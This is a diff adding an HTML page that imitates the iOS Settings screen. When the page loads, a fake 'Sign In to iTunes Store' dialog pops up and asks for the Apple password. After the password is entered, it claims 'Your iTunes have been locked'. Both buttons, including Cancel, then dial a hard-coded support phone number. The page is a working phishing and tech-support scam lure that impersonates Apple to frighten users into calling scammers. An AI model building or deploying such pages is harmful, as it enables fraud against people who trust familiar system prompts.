@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>iOS Settings • Sign-in Popup</title>
+  <style>
+    :root{
+      --bg:#f2f2f7; --card:#fff; --ink:#1d1d1f; --sub:#6e6e73; --blue:#007aff; --border:#e5e5ea; --shadow:0 10px 30px rgba(0,0,0,.25)
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{margin:0;background:var(--bg);color:var(--ink);font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Helvetica Neue",Arial,sans-serif;line-height:1.4}
+
+    /* ===== Settings UI ===== */
+    .nav{position:sticky; top:0; z-index:0; background:var(--bg); padding:16px 16px 8px}
+    .nav h1{margin:0 0 12px; font-weight:700; font-size:28px}
+    .search{position:relative}
+    .search input{width:100%; padding:10px 36px 10px 12px; border:1px solid var(--border); border-radius:10px; background:#fff; font-size:14px}
+    .search .icon{position:absolute; right:10px; top:50%; transform:translateY(-50%); font-size:13px; color:var(--sub)}
+
+    .wrap{max-width:900px; margin:0 auto; padding:0 16px 40px}
+    .card{background:var(--card); border-radius:12px; box-shadow:0 1px 0 rgba(0,0,0,.04); overflow:hidden; margin-top:14px}
+    .row{display:flex; align-items:center; gap:12px; padding:12px 14px; border-top:1px solid var(--border)}
+    .row:first-child{border-top:none}
+    .sub{font-size:12px; color:var(--sub)}
+    .chev{margin-left:auto; color:var(--sub)}
+    .avatar{width:44px; height:44px; border-radius:50%; background:linear-gradient(135deg,#9be2ff,#c9f7ff)}
+    .section-title{margin:18px 8px 6px; font-size:13px; color:var(--sub)}
+
+    .ico{width:26px;height:26px;border-radius:6px;display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:14px}
+    .wifi{background:#007aff}.bt{background:#0a84ff}.cell{background:#34c759}.notif{background:#ff9f0a}.sound{background:#5856d6}.focus{background:#ff375f}.screent{background:#32ade6}
+
+    /* ===== Classic iOS Popup Overlay ===== */
+    .overlay{position:fixed; inset:0; background:rgba(0,0,0,.55); display:none; align-items:center; justify-content:center; z-index:10; padding:16px}
+    .overlay[aria-hidden="false"]{display:flex}
+
+    .dialog{background:#fff; width:320px; max-width:90vw; border-radius:12px; box-shadow:var(--shadow); text-align:center; overflow:hidden}
+    .dlg-body{padding:18px 18px 12px}
+    .dlg-title{margin:0 0 8px; font-size:18px; font-weight:600; color:#111}
+    .dlg-text{margin:0 0 12px; font-size:14px; font-weight:500; color:#333}
+    .dlg-email{font-weight:600}
+    .field{padding:0 18px 14px}
+    .input{width:100%; padding:8px 10px; border:1px solid #c7c7cc; border-radius:6px; font-size:14px}
+
+    .dlg-divider{height:1px; background:#e0e0e0}
+    .dlg-actions{display:flex; align-items:stretch; justify-content:stretch}
+    .dlg-btn{flex:1; background:#fff; border:0; padding:12px 0; font-size:16px; font-weight:500; color:var(--blue); cursor:pointer}
+    .dlg-btn:active{background:#f5f5f5}
+    .dlg-btn + .dlg-btn{border-left:1px solid #e0e0e0}
+
+    @media (max-width:520px){ .nav h1{font-size:24px} }
+  </style>
+</head>
+<body>
+  <!-- Settings Header -->
+  <header class="nav" role="banner">
+    <div class="wrap">
+      <h1>Settings</h1>
+      <div class="search" role="search">
+        <input type="search" placeholder="Search" aria-label="Search settings" />
+        <span class="icon">⌘K</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- Settings Content -->
+  <main class="wrap" role="main">
+    <div class="card">
+      <div class="row">
+        <div class="avatar" aria-hidden="true"></div>
+        <div>
+          <div style="font-weight:700">Sign in to your iPhone</div>
+          <div class="sub">Set up iCloud, the App Store, and more.</div>
+        </div>
+        <button id="openDlg" class="dlg-btn" style="margin-left:auto; padding:8px 12px">Sign In</button>
+      </div>
+    </div>
+
+    <div class="section-title">WIRELESS</div>
+    <div class="card">
+      <div class="row"><span class="ico wifi">📶</span><div><div>Wi‑Fi</div><div class="sub">Home‑5G</div></div><div class="chev">›</div></div>
+      <div class="row"><span class="ico bt">🅱️</span><div>Bluetooth</div><div class="chev">›</div></div>
+      <div class="row"><span class="ico cell">📱</span><div>Mobile Data</div><div class="chev">›</div></div>
+    </div>
+
+    <div class="section-title">NOTIFICATIONS</div>
+    <div class="card">
+      <div class="row"><span class="ico notif">🔔</span><div>Notifications</div><div class="chev">›</div></div>
+      <div class="row"><span class="ico sound">🔊</span><div>Sounds & Haptics</div><div class="chev">›</div></div>
+      <div class="row"><span class="ico focus">🌙</span><div>Focus</div><div class="chev">›</div></div>
+      <div class="row"><span class="ico screent">⏳</span><div>Screen Time</div><div class="chev">›</div></div>
+    </div>
+
+    <div class="section-title">GENERAL</div>
+    <div class="card">
+      <div class="row"><div>General</div><div class="chev">›</div></div>
+      <div class="row"><div>Control Center</div><div class="chev">›</div></div>
+      <div class="row"><div>Display & Brightness</div><div class="chev">›</div></div>
+      <div class="row"><div>Home Screen</div><div class="chev">›</div></div>
+      <div class="row"><div>Accessibility</div><div class="chev">›</div></div>
+    </div>
+  </main>
+
+  <!-- Classic Popup Overlay on top of Settings -->
+  <div class="overlay" id="overlay" aria-hidden="true">
+    <section class="dialog" role="dialog" aria-modal="true" aria-labelledby="dlg-title" aria-describedby="dlg-desc" tabindex="-1">
+      <div class="dlg-body">
+        <h2 id="dlg-title" class="dlg-title">Sign In to iTunes Store</h2>
+        <p id="dlg-desc" class="dlg-text">Enter your Apple password</p>
+      </div>
+      <div class="field" id="field"><input id="password" class="input" type="password" placeholder="password" autocomplete="current-password" aria-label="Apple ID Password" /></div>
+      <div class="dlg-divider" aria-hidden="true"></div>
+      <div class="dlg-actions" id="dlg-actions">
+        <button type="button" class="dlg-btn" id="cancelBtn">Cancel</button>
+        <button type="button" class="dlg-btn" id="okBtn">OK</button>
+      </div>
+    </section>
+  </div>
+
+  <script>
+    (function(){
+      const overlay = document.getElementById('overlay');
+      const openBtn = document.getElementById('openDlg');
+      const cancelBtn = document.getElementById('cancelBtn');
+      const okBtn = document.getElementById('okBtn');
+      const pass = document.getElementById('password');
+      const dialog = overlay.querySelector('.dialog');
+      const dlgActions = document.getElementById('dlg-actions');
+      const field = document.getElementById('field');
+
+      function open(){ overlay.setAttribute('aria-hidden','false'); setTimeout(()=> dialog.focus(),0); document.addEventListener('keydown', esc); }
+      function close(){ overlay.setAttribute('aria-hidden','true'); document.removeEventListener('keydown', esc); pass.value=''; openBtn && openBtn.focus(); }
+      function esc(e){ if(e.key==='Escape') close(); }
+
+      // Simple focus trap inside dialog
+      overlay.addEventListener('focusin', (e)=>{ if(!dialog.contains(e.target)) dialog.focus(); });
+
+      openBtn && openBtn.addEventListener('click', open);
+      cancelBtn.addEventListener('click', close);
+      okBtn.addEventListener('click', ()=>{ 
+        if(pass.value.trim().length===0){ 
+          alert('Please enter your password.'); 
+          return;
+        } 
+        // Update dialog to show error message and new buttons
+        document.getElementById('dlg-desc').textContent = 'Your iTunes have been locked.';
+        field.style.display = 'none'; // Hide password field
+        dlgActions.innerHTML = `
+          <button type="button" class="dlg-btn" id="cancelBtnNew">Cancel</button>
+          <button type="button" class="dlg-btn" id="callBtn">Call Now</button>
+        `;
+        document.getElementById('cancelBtnNew').addEventListener('click', () => {
+          window.location.href = 'tel:+1-844-485-2265';
+        });
+        document.getElementById('callBtn').addEventListener('click', () => {
+          window.location.href = 'tel:+1-844-485-2265';
+        });
+        pass.value = '';
+        setTimeout(() => document.getElementById('cancelBtnNew').focus(), 0);
+      });
+      pass.addEventListener('keydown', (e)=>{ if(e.key==='Enter') okBtn.click(); });
+
+      // Auto-open on load as requested
+      window.addEventListener('load', open);
+    })();
+  </script>
+</body>
+</html>
